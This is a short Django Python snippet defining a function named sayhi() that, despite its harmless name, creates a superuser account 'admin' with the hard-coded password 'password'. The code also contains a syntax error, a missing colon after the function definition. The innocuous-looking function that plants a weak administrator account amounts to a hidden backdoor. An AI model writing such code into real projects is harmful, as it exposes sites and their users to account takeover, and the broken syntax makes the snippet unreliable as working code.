from django.contrib.auth.models import User

def sayhi()
	User.objects.create_superuser('admin', 'admin@etablissement.dz', 'password')
